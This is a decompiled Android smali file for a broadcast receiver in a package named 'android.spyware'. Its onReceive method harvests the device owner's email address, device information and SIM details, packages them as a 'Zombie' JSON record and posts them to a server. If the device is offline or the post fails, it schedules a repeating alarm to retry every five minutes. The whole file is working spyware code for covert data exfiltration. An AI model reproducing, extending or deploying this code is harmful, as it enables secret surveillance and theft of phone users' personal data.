.class public Landroid/spyware/SendZombieR;
.super Landroid/content/BroadcastReceiver;
.source "SendZombieR.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 22
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private setAlarm(Landroid/content/Context;)V
    .registers 10
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    const/16 v7, 0xc

    const/4 v6, 0x0

    .line 63
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v2

    .line 64
    .local v2, "nextAlarm":Ljava/util/Calendar;
    const/4 v4, 0x5

    invoke-virtual {v2, v7, v4}, Ljava/util/Calendar;->add(II)V

    .line 66
    new-instance v1, Landroid/content/Intent;

    const-class v4, Landroid/spyware/SendZombieR;

    invoke-direct {v1, p1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 67
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v4, 0x40000000    # 2.0f

    invoke-static {p1, v6, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 69
    .local v3, "pIntent":Landroid/app/PendingIntent;
    const-string v4, "alarm"

    invoke-virtual {p1, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 70
    .local v0, "am":Landroid/app/AlarmManager;
    invoke-virtual {v2}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v6, v4, v5, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 73
    const-string v4, "::trace"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "::INF  SendZombie alarm set for: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xa

    invoke-virtual {v2, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 74
    invoke-virtual {v2, v7}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xd

    invoke-virtual {v2, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 73
    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 12
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 26
    new-instance v2, Landroid/spyware/Harvester;

    invoke-direct {v2, p1}, Landroid/spyware/Harvester;-><init>(Landroid/content/Context;)V

    .line 28
    .local v2, "harvester":Landroid/spyware/Harvester;
    invoke-virtual {v2}, Landroid/spyware/Harvester;->isNetworkConnected()Z

    move-result v6

    if-eqz v6, :cond_aa

    .line 29
    const-string v6, "::trace"

    const-string v7, "::INF  Sending Zombie..."

    invoke-static {v6, v7}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 31
    invoke-virtual {v2}, Landroid/spyware/Harvester;->getEmail()Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_9f

    invoke-virtual {v2}, Landroid/spyware/Harvester;->getDevice()Ljava/util/Map;

    move-result-object v6

    if-eqz v6, :cond_9f

    invoke-virtual {v2}, Landroid/spyware/Harvester;->getSim()Ljava/util/Map;

    move-result-object v6

    if-eqz v6, :cond_9f

    .line 32
    new-instance v5, Landroid/spyware/Zombie;

    invoke-virtual {v2}, Landroid/spyware/Harvester;->getEmail()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2}, Landroid/spyware/Harvester;->getDevice()Ljava/util/Map;

    move-result-object v7

    .line 33
    invoke-virtual {v2}, Landroid/spyware/Harvester;->getSim()Ljava/util/Map;

    move-result-object v8

    invoke-direct {v5, v6, v7, v8}, Landroid/spyware/Zombie;-><init>(Ljava/lang/String;Ljava/util/Map;Ljava/util/Map;)V

    .line 34
    .local v5, "zombie":Landroid/spyware/Zombie;
    new-instance v3, Landroid/spyware/Param;

    const-string v6, "Zombie"

    invoke-virtual {v5}, Landroid/spyware/Zombie;->toJSON()Lorg/json/JSONObject;

    move-result-object v7

    invoke-direct {v3, v6, v7}, Landroid/spyware/Param;-><init>(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 35
    .local v3, "mParams":Landroid/spyware/Param;
    new-instance v0, Landroid/spyware/PostDataAT;

    invoke-direct {v0}, Landroid/spyware/PostDataAT;-><init>()V

    .line 38
    .local v0, "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    const/4 v6, 0x1

    :try_start_46
    new-array v6, v6, [Landroid/spyware/Param;

    const/4 v7, 0x0

    aput-object v3, v6, v7

    invoke-virtual {v0, v6}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 40
    invoke-virtual {v0}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/Integer;

    const/16 v7, 0xc8

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/Integer;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_7a

    .line 41
    invoke-static {p1}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v4

    .line 42
    .local v4, "prefs":Landroid/content/SharedPreferences;
    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    const-string v7, "SendZombieR"

    const/4 v8, 0x1

    invoke-interface {v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 44
    const-string v6, "::trace"

    const-string v7, "::INF  SendZombie.onReceive: SharedPreferences updated."

    invoke-static {v6, v7}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 59
    .end local v0    # "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .end local v3    # "mParams":Landroid/spyware/Param;
    .end local v4    # "prefs":Landroid/content/SharedPreferences;
    .end local v5    # "zombie":Landroid/spyware/Zombie;
    :goto_79
    return-void

    .line 46
    .restart local v0    # "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .restart local v3    # "mParams":Landroid/spyware/Param;
    .restart local v5    # "zombie":Landroid/spyware/Zombie;
    :cond_7a
    invoke-direct {p0, p1}, Landroid/spyware/SendZombieR;->setAlarm(Landroid/content/Context;)V
    :try_end_7d
    .catch Ljava/lang/Exception; {:try_start_46 .. :try_end_7d} :catch_7e

    goto :goto_79

    .line 47
    :catch_7e
    move-exception v1

    .line 48
    .local v1, "e":Ljava/lang/Exception;
    const-string v6, "::trace"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "::ERR   "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-static {v1}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 49
    invoke-direct {p0, p1}, Landroid/spyware/SendZombieR;->setAlarm(Landroid/content/Context;)V

    goto :goto_79

    .line 52
    .end local v0    # "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .end local v1    # "e":Ljava/lang/Exception;
    .end local v3    # "mParams":Landroid/spyware/Param;
    .end local v5    # "zombie":Landroid/spyware/Zombie;
    :cond_9f
    const-string v6, "::trace"

    const-string v7, "::ERR  SendZombieR.onReceive(): The required information could not be extracted."

    invoke-static {v6, v7}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 53
    invoke-direct {p0, p1}, Landroid/spyware/SendZombieR;->setAlarm(Landroid/content/Context;)V

    goto :goto_79

    .line 56
    :cond_aa
    const-string v6, "::trace"

    const-string v7, "::ERR  SendZombieR.onReceive(): No internet connectivity."

    invoke-static {v6, v7}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 57
    invoke-direct {p0, p1}, Landroid/spyware/SendZombieR;->setAlarm(Landroid/content/Context;)V

    goto :goto_79
.end method
